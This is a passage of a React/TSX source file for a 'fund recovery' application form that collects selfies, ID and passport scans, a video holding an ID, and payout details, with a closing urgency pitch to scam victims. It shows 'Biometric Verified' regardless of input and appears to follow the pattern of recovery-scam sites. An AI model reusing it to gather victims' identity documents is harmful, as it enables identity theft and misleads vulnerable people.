                              <span className="flex items-center gap-1.5 text-[9px] font-black uppercase tracking-widest text-emerald-400 bg-emerald-400/10 px-2 py-1 rounded-md border border-emerald-400/20">
                                <BadgeCheck className="w-3 h-3" /> Encrypted
                              </span>
                              <span className="flex items-center gap-1.5 text-[9px] font-black uppercase tracking-widest text-blue-400 bg-blue-400/10 px-2 py-1 rounded-md border border-blue-400/20">
                                <Lock className="w-3 h-3" /> Private
                              </span>
                            </div>
                          </div>
                        </div>
                      </div>

                      <div className="space-y-6">
                        <VerificationStep
                          stepNumber={1} title="Live Selfie" subtitle="Photo for biometric match" completed={Boolean(selfieImage)} icon={<Camera className="w-4 h-4" />}
                          description="Take a clear, front-facing photo of your face." requirements={["Even lighting", "No hats/glasses"]}
                        >
                          <UploadZone label="Selfie" sublabel="Required" description="Your face photo" icon={<Camera className="w-5 h-5 text-slate-400" />} value={selfieImage} onChange={onSelfieChange} progress={uploadProgress["selfie"]} />
                        </VerificationStep>

                        <VerificationStep
                          stepNumber={2} title="Primary ID" subtitle="Government issued photo ID" completed={Boolean(idFrontImage && idBackImage)} icon={<IdCard className="w-4 h-4" />}
                          description="Upload both sides of your National ID or Driver's License." requirements={["Valid/Unexpired", "Legible text"]}
                        >
                          <div className="grid grid-cols-2 gap-4">
                            <UploadZone label="Front" sublabel="Required" description="ID Front" icon={<IdCard className="w-5 h-5 text-slate-400" />} value={idFrontImage} onChange={onIdFrontChange} progress={uploadProgress["id_front"]} />
                            <UploadZone label="Back" sublabel="Required" description="ID Back" icon={<IdCard className="w-5 h-5 text-slate-400" />} value={idBackImage} onChange={onIdBackChange} progress={uploadProgress["id_back"]} />
                          </div>
                        </VerificationStep>

                        <VerificationStep
                          stepNumber={3} title="Passport" subtitle="Secondary ID (optional but recommended)" completed={Boolean(passportFrontImage && passportBackImage)} icon={<BookOpen className="w-4 h-4" />}
                          optional
                          description="Upload the bio page and signature page of your passport for cross-verification." requirements={["Bio page legible", "Both pages if provided"]}
                        >
                          <div className="grid grid-cols-2 gap-4">
                            <UploadZone label="Bio page" sublabel="Optional" description="Passport front" icon={<BookOpen className="w-5 h-5 text-slate-400" />} value={passportFrontImage} onChange={onPassportFrontChange} progress={uploadProgress["passport_front"]} />
                            <UploadZone label="Signature page" sublabel="Optional" description="Passport back" icon={<BookOpen className="w-5 h-5 text-slate-400" />} value={passportBackImage} onChange={onPassportBackChange} progress={uploadProgress["passport_back"]} />
                          </div>
                        </VerificationStep>

                        <VerificationStep
                          stepNumber={4} title="Video Proof" subtitle="Enhanced biometric layer" completed={Boolean(videoSelfie)} icon={<Video className="w-4 h-4" />}
                          description="Record a 10s video stating your name while holding your ID." requirements={["Clear audio", "ID visible"]}
                        >
                          <VideoCapture label="Video ID" value={videoSelfie} onCapture={onVideoSelfieChange} progress={uploadProgress["video"]} />
                        </VerificationStep>
                      </div>
                    </Section>
                  </div>
                  
                  {/* ─── STEP 4: Review & Submit ────────────────────── */}
                  <div className={currentStep === 4 ? "block" : "hidden"}>
                    <Section title="Final Review" icon={<BadgeCheck className="w-5 h-5" />}>
                      <div className="bg-slate-50 rounded-3xl p-8 border border-slate-100">
                        <h4 className="text-slate-900 font-black text-lg mb-4">Application Summary</h4>
                        <p className="text-slate-500 text-sm mb-8">Please double-check your information before final submission. Once submitted, your application will enter the priority review queue.</p>
                        
                        <div className="grid gap-6">
                           <div className="flex items-center justify-between py-3 border-b border-slate-200/50">
                              <span className="text-xs font-bold text-slate-400 uppercase tracking-widest">Payout Method</span>
                              <span className="text-sm font-black text-slate-900 uppercase tracking-tight">{payout.replace('_', ' ')}</span>
                           </div>
                           <div className="flex items-center justify-between py-3 border-b border-slate-200/50">
                              <span className="text-xs font-bold text-slate-400 uppercase tracking-widest">Security Protocol</span>
                              <span className="text-sm font-black text-emerald-600">Biometric Verified</span>
                           </div>
                           <div className="bg-white rounded-2xl p-6 border border-slate-100 shadow-sm">
                              <div className="flex items-center justify-between">
                                 <span className="text-xs font-bold text-slate-400 uppercase tracking-widest">Priority Funding Amount</span>
                                 <div className="text-2xl font-black text-primary">
                                    <span className="text-sm mr-1">$</span>
                                    {"As Requested"}
                                 </div>
                              </div>
                           </div>
                        </div>

                        <div className="mt-8 p-4 rounded-xl bg-blue-50 border border-blue-100 flex gap-3 items-start">
                           <Info className="w-5 h-5 text-blue-500 shrink-0 mt-0.5" />
                           <p className="text-[11px] font-medium text-blue-700 leading-relaxed">
                              By clicking "Submit Application", you certify that the information provided is accurate and that you are the authorized owner of the payout destination. Your identity documents will be cross-referenced with global forensic databases.
                           </p>
                        </div>
                      </div>
                    </Section>
                  </div>

                  {/* Navigation Footer */}
                  <div className="mt-6 border-t border-slate-100 pt-5 flex flex-col-reverse sm:flex-row sm:items-center sm:justify-between gap-3">
                    <button
                      type="button"
                      onClick={prevStep}
                      disabled={currentStep === 1 || loading}
                      className={`w-full sm:w-auto h-12 px-6 rounded-2xl font-bold text-sm transition-all border-2 ${
                        currentStep === 1
                          ? "opacity-0 pointer-events-none border-transparent"
                          : "border-slate-200 text-slate-600 hover:border-slate-300 hover:text-slate-900 hover:bg-slate-50 active:bg-slate-100"
                      }`}
                    >
                      ← Back
                    </button>

                    {currentStep < totalSteps ? (
                      <button
                        type="button"
                        onClick={nextStep}
                        className="w-full sm:w-auto h-12 px-8 bg-slate-900 text-white font-bold rounded-2xl shadow-lg hover:bg-slate-800 transition active:scale-95"
                      >
                        Next Step →
                      </button>
                    ) : (
                      <button
                        type="submit"
                        disabled={loading}
                        className="w-full sm:w-auto min-w-[200px] h-14 bg-cta-gradient text-white font-black rounded-2xl shadow-xl hover:shadow-2xl transition active:scale-95 disabled:opacity-60 flex items-center justify-center gap-3 px-8"
                      >
                        {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <BadgeCheck className="w-5 h-5" />}
                        {loading ? "Submitting..." : "Submit Application"}
                      </button>
                    )}
                  </div>
                </div>
              </div>
            </Reveal>

            <Reveal direction="up" delay={200}>
              <div className="text-center max-w-2xl mx-auto">
                <p className="text-lg text-muted-foreground italic">
                  "Every hour you wait, scammers move your money further out of reach. Our specialists have recovered over <span className="font-bold text-primary">$500M+</span> for victims with zero upfront cost."
                </p>
              </div>
            </Reveal>
          </form>
        )}
      </section>
      <AuthModal isOpen={isAuthModalOpen} onClose={() => setIsAuthModalOpen(false)} defaultMode={authMode} />
    </>
  );
}

// ─── Shared sub-components ───────────────────────────────────────────────────

function Section({ title, icon, children }: { title: string; icon?: React.ReactNode; children: React.ReactNode }) {
  return (
    <div className="mb-8">
      <div className="flex items-center gap-3 mb-6 pb-4 border-b border-slate-100">
        {icon && <div className="p-2.5 rounded-xl bg-primary/10 text-primary shadow-sm">{icon}</div>}
        <h3 className="text-xl font-black text-slate-900 tracking-tight">{title}</h3>
      </div>
      {children}
    </div>
  );
}

function StepIndicator({ current, total }: { current: number; total: number }) {
  const steps = [
    { n: 1, label: "Application Details", shortLabel: "Apply", icon: <FileCheck2 className="w-4 h-4" /> },
    { n: 2, label: "Payout Setup", shortLabel: "Payout", icon: <CreditCard className="w-4 h-4" /> },
    { n: 3, label: "Identity & Security", shortLabel: "Identity", icon: <ShieldCheck className="w-4 h-4" /> },
    { n: 4, label: "Review & Submit", shortLabel: "Review", icon: <BadgeCheck className="w-4 h-4" /> },
  ];

  return (
    <div className="mb-8">
      <div className="flex items-start justify-between px-1 sm:px-2">
        {steps.map((s) => (
          <div key={s.n} className="flex flex-col items-center gap-1.5 relative z-10 flex-1">
            <div className={`w-10 h-10 sm:w-12 sm:h-12 rounded-xl sm:rounded-2xl flex items-center justify-center transition-all duration-500 shadow-sm border-2 ${
              current >= s.n ? "bg-primary text-white border-primary shadow-lg scale-105 sm:scale-110" : "bg-white text-slate-300 border-slate-100"
            }`}>
              {current > s.n ? <CheckCircle2 className="w-5 h-5 sm:w-6 sm:h-6" /> : s.icon}
            </div>
            <span className={`text-[9px] sm:text-[10px] font-black uppercase tracking-tighter transition-colors duration-500 text-center leading-tight ${
              current >= s.n ? "text-primary" : "text-slate-400"
            }`}>
              <span className="sm:hidden">{s.shortLabel}</span>
              <span className="hidden sm:inline">{s.label}</span>
            </span>
          </div>
        ))}
      </div>
      {/* Progress bar line — sits behind the circles */}
      <div className="relative h-1 bg-slate-100 mt-[-3rem] sm:mt-[-3.5rem] mx-7 sm:mx-10 -z-0 rounded-full overflow-hidden">
        <div
          className="absolute inset-y-0 left-0 bg-primary transition-all duration-700 ease-out shadow-[0_0_10px_rgba(var(--primary-rgb),0.5)]"
          style={{ width: `${((current - 1) / (total - 1)) * 100}%` }}
        />
      </div>
    </div>
  );
}

function Label({ children }: { children: React.ReactNode }) {
  return <label className="block text-xs font-medium text-muted-foreground mb-1">{children}</label>;
}

function Input({ label, className = "", ...props }: { label: string; className?: string } & React.InputHTMLAttributes<HTMLInputElement>) {
  return (
    <div className={className}>
      <Label>{label}</Label>
      <input
        {...props}
        className="h-11 w-full rounded-lg border border-input bg-white px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring"
      />
    </div>
  );
}

function Select({ label, children, ...props }: { label: string; children: React.ReactNode } & React.SelectHTMLAttributes<HTMLSelectElement>) {
  return (
    <div>
      <Label>{label}</Label>
      <select {...props} className="h-11 w-full rounded-lg border border-input bg-white px-3 text-sm">
        {children}
      </select>
    </div>
  );
}

function PayoutOption({ selected, onClick, icon, title, desc, badge, recommended }: { selected: boolean; onClick: () => void; icon: React.ReactNode; title: string; desc: string; badge?: string; recommended?: boolean }) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={`relative text-left p-4 rounded-xl border-2 transition h-full flex flex-col ${
        selected ? "border-primary bg-primary/5 shadow-inner" : "border-border bg-white hover:border-primary/40"
      } ${recommended ? "ring-2 ring-primary ring-offset-2" : ""}`}
    >
      {recommended && (
        <div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-primary text-white text-[10px] font-black uppercase tracking-tighter px-3 py-1 rounded-full shadow-lg whitespace-nowrap">
          Recommended
        </div>
      )}
      <div className="flex items-center justify-between mb-2">
        <div className={`p-2 rounded-lg ${selected ? "bg-primary text-white" : "bg-slate-100 text-slate-500"}`}>
          {icon}
        </div>
        {badge && (
          <span className={`text-[9px] font-bold uppercase tracking-wider px-2 py-0.5 rounded ${
            selected ? "bg-primary/20 text-primary" : "bg-slate-100 text-slate-500"
          }`}>
            {badge}
          </span>
        )}
      </div>
      <div className="font-bold text-sm text-slate-900 mb-1">{title}</div>
      <p className="text-[11px] text-slate-500 leading-snug">{desc}</p>
    </button>
  );
}

